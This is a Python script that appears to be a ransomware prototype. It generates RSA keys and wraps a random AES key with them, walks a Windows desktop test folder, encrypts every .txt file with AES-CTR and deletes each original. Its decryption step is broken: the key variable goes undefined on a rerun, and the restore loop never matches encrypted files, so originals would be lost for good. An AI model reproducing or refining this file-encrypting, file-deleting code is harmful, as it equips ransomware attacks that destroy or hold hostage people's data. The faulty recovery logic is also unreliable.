from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import json

# Configuration
CONFIG = {
    'smem_file': 'smem_unencrypted.txt',
    'private_key_file': 'private_key.pem',
    'public_key_file': 'public_key.pem',
    'encrypted_file_extension': '.encrypted',
    'target_directory': r'C:\Users\benji\Desktop\test',
    'delete_files_after_encryption': True,
    'perform_smem_decryption': True
}

def load_or_generate_rsa_keys():
    if os.path.exists(CONFIG['private_key_file']) and os.path.exists(CONFIG['public_key_file']):
        with open(CONFIG['private_key_file'], 'rb') as f:
            private_key_pem = f.read()
        private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())

        with open(CONFIG['public_key_file'], 'rb') as f:
            public_key_pem = f.read()
        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
    else:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        with open(CONFIG['private_key_file'], 'wb') as f:
            f.write(private_key_pem)

        public_key = private_key.public_key()
        public_key_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        with open(CONFIG['public_key_file'], 'wb') as f:
            f.write(public_key_pem)
    
    return private_key, public_key

def encrypt_symmetric_key(symmetric_key, public_key):
    encrypted_smem = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open('smem-enc', 'wb') as f:
        f.write(encrypted_smem)

def decrypt_smem_enc(private_key):
    if os.path.exists('smem-enc'):
        with open('smem-enc', 'rb') as f:
            encrypted_smem = f.read()
        smem = private_key.decrypt(
            encrypted_smem,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        with open('smem_unencrypted.txt', 'wb') as f:
            f.write(smem)
    else:
        print("smem-enc file does not exist.")

def encrypt_file(smem, file_path):
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(smem), modes.CTR(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    encrypted_file_path = file_path + CONFIG['encrypted_file_extension']
    with open(encrypted_file_path, 'wb') as f:
        f.write(iv + ciphertext)

    if CONFIG['delete_files_after_encryption'] and os.path.exists(file_path):
        os.remove(file_path)

def decrypt_file(smem, file_path):
    with open(file_path, 'rb') as f:
        data = f.read()

    iv = data[:16]
    ciphertext = data[16:]

    cipher = Cipher(algorithms.AES(smem), modes.CTR(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    decrypted_file_path = file_path[:-len(CONFIG['encrypted_file_extension'])]
    with open(decrypted_file_path, 'wb') as f:
        f.write(plaintext)

    os.remove(file_path)

def main():
    private_key, public_key = load_or_generate_rsa_keys()

    if not os.path.exists('smem-enc'):
        smem = os.urandom(32)
        with open(CONFIG['smem_file'], 'wb') as f:
            f.write(smem)
        encrypt_symmetric_key(smem, public_key)

    target_files = []
    for root, dirs, files in os.walk(CONFIG['target_directory']):
        for file in files:
            if file.endswith('.txt'):
                target_files.append(os.path.join(root, file))

    for file_path in target_files:
        encrypted_file_path = file_path + CONFIG['encrypted_file_extension']
        if not os.path.exists(encrypted_file_path):
            encrypt_file(smem, file_path)

    if CONFIG['perform_smem_decryption']:
        decrypt_smem_enc(private_key)
        for file_path in target_files:
            if file_path.endswith(CONFIG['encrypted_file_extension']):
                decrypt_file(smem, file_path)

if __name__ == '__main__':
    main()
